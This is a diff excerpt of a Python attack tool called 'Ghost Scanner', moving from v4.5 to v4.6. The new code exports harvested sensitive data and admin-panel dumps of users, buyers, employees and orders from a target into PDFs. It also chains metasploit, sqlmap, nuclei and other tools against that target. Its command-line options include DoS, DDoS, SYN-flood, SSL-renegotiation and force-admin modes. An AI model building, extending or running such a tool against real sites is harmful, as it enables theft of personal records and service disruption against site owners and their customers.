                 console.print(f"[yellow]AI attempt {attempt+1}: {str(e)[:100]}[/yellow]"); time.sleep(5)
         return "AI Analysis failed."
 
-    # ---------- PDF MAIN ----------
+    # ---------- PDF ----------
     def _generate_pdf(self, results, output_path="report.pdf"):
         class PDF(FPDF):
             def header(self):
                 self.set_font('Arial', 'B', 16)
-                self.cell(0, 10, 'Ghost Scanner v4.5 - Report', ln=True, align='C'); self.ln(5)
+                self.cell(0, 10, 'Ghost Scanner v4.6 - Report', ln=True, align='C'); self.ln(5)
             def footer(self):
                 self.set_y(-15); self.set_font('Arial', 'I', 8)
                 self.cell(0, 10, f'Page {self.page_no()}', align='C')
@@ -1284,11 +1290,12 @@ Berikan analisis dalam format Markdown:
                 pdf.set_font('Arial', 'B', 10); pdf.cell(0, 6, f'[{vt}] {len(vs)} finding(s)', ln=True)
                 pdf.set_font('Arial', '', 8)
                 for v in vs[:3]:
-                    pdf.multi_cell(0, 5, f"  Param: {v.get('param','N/A')} | Payload: {v.get('payload','N/A')[:50]} | Risk: {v.get('risk')} | Conf: {v.get('confidence',0)}%")
-                    if 'poc' in v:
-                        pdf.multi_cell(0, 5, f"    PoC: {v['poc'].get('url','N/A')[:100]}")
-                        pdf.multi_cell(0, 5, f"    Verified: {v['poc'].get('verified', False)}")
+                    pdf.multi_cell(0, 5, f"  Param: {v.get('param','N/A')} | Payload: {v.get('payload','N/A')[:50]} | Risk: {v.get('risk')}")
                 pdf.ln(1)
+        pdf.add_page(); pdf.set_font('Arial', 'B', 13); pdf.cell(0, 8, 'Sensitive Data', ln=True)
+        pdf.set_font('Arial', '', 9)
+        for k, v in results["sensitive_data"].items():
+            if v: pdf.multi_cell(0, 5, f'{k.upper()}: {", ".join(str(x) for x in v[:10])}')
         if results.get("ai_analysis"):
             pdf.add_page(); pdf.set_font('Arial', 'B', 13); pdf.cell(0, 8, 'AI Analysis', ln=True)
             pdf.set_font('Arial', '', 9)
@@ -1310,6 +1317,45 @@ Berikan analisis dalam format Markdown:
                     with open(fn, 'w', encoding='utf-8') as f: f.write('\n'.join(uniq))
                     self.results_scan["sensitive_data"][k] = uniq[:20]
 
+    def _generate_sensitive_pdf(self, data_type, data_list, target, output_dir):
+        if not data_list: return None
+        class PDF(FPDF):
+            def header(self):
+                self.set_font('Arial', 'B', 14)
+                self.cell(0, 10, f'{data_type.upper()} - Ghost Scanner v4.6', ln=True, align='C'); self.ln(3)
+            def footer(self):
+                self.set_y(-15); self.set_font('Arial', 'I', 8)
+                self.cell(0, 10, f'Target: {target} | Page {self.page_no()}', align='C')
+        pdf = PDF(); pdf.add_page(); pdf.set_font('Arial', '', 11)
+        pdf.cell(0, 8, f'Target: {target}', ln=True)
+        pdf.cell(0, 8, f'Data Type: {data_type.upper()}', ln=True)
+        pdf.cell(0, 8, f'Total: {len(data_list)}', ln=True)
+        pdf.ln(5); pdf.set_font('Arial', 'B', 12); pdf.cell(0, 8, 'DATA:', ln=True)
+        pdf.set_font('Arial', '', 9)
+        for i, item in enumerate(data_list[:500], 1):
+            text = json.dumps(item, ensure_ascii=False) if isinstance(item, dict) else str(item)
+            pdf.multi_cell(0, 5, f'{i}. {text[:300]}')
+        os.makedirs(output_dir, exist_ok=True)
+        filename = os.path.join(output_dir, f'{data_type}_{int(time.time())}.pdf')
+        pdf.output(filename)
+        Console().print(f"[green]✓ PDF {data_type}: {filename}[/green]")
+        return filename
+
+    def _generate_all_sensitive_pdfs(self, sensitive_data, admin_data, target):
+        pdf_dir = os.path.join(self.sensitive_folder, 'pdfs')
+        os.makedirs(pdf_dir, exist_ok=True)
+        pdfs = []
+        for key, values in sensitive_data.items():
+            if values and isinstance(values, list) and len(values) > 0:
+                fp = self._generate_sensitive_pdf(key, values, target, pdf_dir)
+                if fp: pdfs.append(fp)
+        if admin_data:
+            for key in ['users','buyers','employees','orders','products']:
+                if admin_data.get(key) and len(admin_data[key]) > 0:
+                    fp = self._generate_sensitive_pdf(f'admin_{key}', admin_data[key], target, pdf_dir)
+                    if fp: pdfs.append(fp)
+        self.results_scan["sensitive_pdfs"] = pdfs
+
     # ---------- MAIN SCAN ----------
     def run_scan(self, target):
         self.results_scan["target"] = target
@@ -1318,7 +1364,7 @@ Berikan analisis dalam format Markdown:
         self.results_scan["timestamp"] = datetime.now().isoformat()
         start = time.time()
         console = Console()
-        console.print(f"[bold red]🚀 Ghost Scan v4.5 on {target}[/bold red]")
+        console.print(f"[bold red]🚀 Ghost Scan v4.6 on {target}[/bold red]")
         console.print(f"[bold cyan]Category: {self.results_scan['domain_category']}[/bold cyan]")
 
         resp = self._smart_request(target, timeout=15)
@@ -1326,7 +1372,7 @@ Berikan analisis dalam format Markdown:
             console.print("[red]Failed to access target![/red]"); return
         html = resp.text
 
-        # Internal
+        # Internal scans
         console.print("[yellow]Internal scans...[/yellow]")
         self.results_scan["vulnerabilities"]["robots"] = self._check_robots(target)
         self.results_scan["vulnerabilities"]["sitemap"] = self._check_sitemap(target)
@@ -1373,19 +1419,17 @@ Berikan analisis dalam format Markdown:
         self.results_scan["vulnerabilities"]["xss_context_aware"] = self._scan_xss_dalfox(target, params)
         self.results_scan["vulnerabilities"]["sql_injection"] = self._scan_sql(target, params)
 
-        # v4.5 External tools
+        # External tools
         if self.use_tools:
-            console.print("[bold magenta]🔥 v4.5: External tools...[/bold magenta]")
-            subdomains = self._run_subfinder(self.results_scan["domain"]) + self._run_amass(self.results_scan["domain"])
-            self.results_scan["external"]["subdomains"] = subdomains
+            console.print("[bold magenta]🔥 v4.6: External tools...[/bold magenta]")
+            self.results_scan["external"]["subdomains"] = self._run_subfinder(self.results_scan["domain"]) + self._run_amass(self.results_scan["domain"])
             self.results_scan["external"]["dns_records"] = self._run_dnsx(self.results_scan["domain"])
-            live_targets = subdomains[:20] if subdomains else [target]
+            live_targets = self.results_scan["external"]["subdomains"][:20] if self.results_scan["external"]["subdomains"] else [target]
             self.results_scan["external"]["live_hosts"] = self._run_httpx(live_targets)
             self.results_scan["external"]["naabu_ports"] = self._run_naabu(self.results_scan["domain"])
             katana_urls = self._run_katana(target)
             self.results_scan["external"]["katana_urls"] = katana_urls[:200]
-            historical = self._run_gau(self.results_scan["domain"]) + self._run_waybackurls(self.results_scan["domain"])
-            self.results_scan["external"]["historical_urls"] = historical[:200]
+            self.results_scan["external"]["historical_urls"] = self._run_gau(self.results_scan["domain"]) + self._run_waybackurls(self.results_scan["domain"])
             self.results_scan["vulnerabilities"]["nuclei"] = self._run_nuclei(target)
             self.results_scan["vulnerabilities"]["ffuf"] = self._run_ffuf(target)
             self.results_scan["vulnerabilities"]["sqlmap"] = self._run_sqlmap(target)
@@ -1394,6 +1438,11 @@ Berikan analisis dalam format Markdown:
             js_urls = [u for u in katana_urls if '.js' in u.lower()][:20]
             self.results_scan["vulnerabilities"]["secretfinder"] = self._run_secretfinder(js_urls)
             self.results_scan["vulnerabilities"]["interactsh"] = self._run_interactsh(target)
+            # v4.6 new tools
+            self.results_scan["vulnerabilities"]["nmap"] = self._run_nmap(target)
+            self.results_scan["vulnerabilities"]["metasploit"] = self._run_metasploit(target)
+            self.results_scan["vulnerabilities"]["wireshark"] = self._run_wireshark(target, duration=10)
+            self.results_scan["vulnerabilities"]["burpsuite"] = self._run_burpsuite(target)
 
         # Summary
         all_f = []
@@ -1428,14 +1477,10 @@ Berikan analisis dalam format Markdown:
         t = Table(title="Findings", box=box.ROUNDED)
         for col in ["Type", "Param", "Risk", "Verified"]: t.add_column(col)
         for f in findings[:20]:
-            v = "✓" if f.get('poc', {}).get('verified') else "?"
+            v = "OK" if f.get('poc', {}).get('verified') else "?"
             t.add_row(f.get('type', 'Unknown')[:40], str(f.get('param', 'N/A'))[:20],
                       f.get('risk', 'INFO'), v)
         c.print(t)
-
-# ========== UTILITY ==========
-def build_url(base, param, payload):
-    return base + ('&' if '?' in base else '?') + param + '=' + quote(payload)
 
 # ========== ATTACK ENGINE ==========
 class AttackEngine:
@@ -1506,7 +1551,7 @@ class AttackEngine:
 # ========== MAIN ==========
 def main():
     if '-h' in sys.argv or '--help' in sys.argv: show_help()
-    p = argparse.ArgumentParser(description="Ghost Scanner v4.5", add_help=False)
+    p = argparse.ArgumentParser(description="Ghost Scanner v4.6", add_help=False)
     p.add_argument('-u', '--url'); p.add_argument('-o', '--output', default='results.json')
     p.add_argument('-v', '--verbose', action='store_true')
     p.add_argument('--proxy-list'); p.add_argument('--validate-proxy', action='store_true')
@@ -1514,7 +1559,7 @@ def main():
     p.add_argument('--pdf', action='store_true'); p.add_argument('--ai', action='store_true')
     p.add_argument('--headless', action='store_true'); p.add_argument('--delay', type=float, default=0.5)
     p.add_argument('--force-admin', action='store_true')
-    p.add_argument('--tools', action='store_true', help='Run external tools (Nuclei, Subfinder, etc.)')
+    p.add_argument('--tools', action='store_true', help='Run all 19 external tools')
     p.add_argument('--wp-check', action='store_true'); p.add_argument('--wp-command')
     p.add_argument('--dos', action='store_true'); p.add_argument('--ddos', action='store_true')
     p.add_argument('--syn', action='store_true'); p.add_argument('--ssl-reneg', action='store_true')
@@ -1524,12 +1569,11 @@ def main():
 
     clear_screen(); show_banner()
 
-    if args.wp_check or args.wp_command:
+    if args.wp_check:
         if not args.url: print("Error: --url required"); sys.exit(1)
         scanner = GhostScanner(target=args.url)
-        if args.wp_check:
-            for r in scanner._check_wp_activity_log(args.url): Console().print(f"[{r.get('risk')}] {r.get('type')}: {r.get('evidence')}")
-            sys.exit(0)
+        for r in scanner._check_wp_activity_log(args.url):
+            Console().print(f"[{r.get('risk')}] {r.get('type')}: {r.get('evidence')}")
         sys.exit(0)
 
     if not args.url:
@@ -1553,7 +1597,9 @@ def main():
         )
         try: scanner.run_scan(args.url)
         except KeyboardInterrupt: Console().print("[red]Interrupted.[/red]")
-        except Exception as e: Console().print(f"[red]Error: {e}[/red]")
+        except Exception as e:
+            Console().print(f"[red]Error: {e}[/red]")
+            import traceback; traceback.print_exc()
 
 if __name__ == "__main__":
     main()
